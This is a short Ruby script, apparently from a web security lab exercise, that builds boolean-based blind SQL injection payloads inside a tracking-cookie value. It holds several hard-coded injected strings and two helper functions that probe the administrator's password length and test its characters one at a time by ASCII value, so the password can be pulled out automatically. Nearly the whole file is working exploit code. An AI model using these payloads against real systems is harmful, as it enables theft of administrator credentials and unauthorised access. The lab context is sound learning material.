session_cookie = "rYjXpryytVRhVOZaS4Th1QtvGCfczSHg"
TRACKING_ID = "G9z8hNrmTzEUiFDR"

injected_tracking_id = "G9z8hNrmTzEUiFDR'+AND+SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm"

find_length = "G9z8hNrmTzEUiFDR' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a"

find_char1 = "G9z8hNrmTzEUiFDR' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') > 'a"

confirm_char1 = "G9z8hNrmTzEUiFDR' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator') = 'q"

# iterate through the chars a-z, 0-9, 
# 

CHARS = ('a'..'z').to_a.concat((0..9).to_a)
ASCII_RANGE = (32..126)

puts CHARS

def sql_password_length(operator, length)
  "#{TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) #{operator} #{length})='a"
end

def sql_char_test(pword_char_index, test_ascii_no, operator)
  "#{TRACKING_ID}' AND ASCII((
    SELECT SUBSTRING(password, #{pword_char_index}, 1)
    FROM users
    WHERE username='administrator'
  )) #{operator} '#{test_ascii_no}"
end

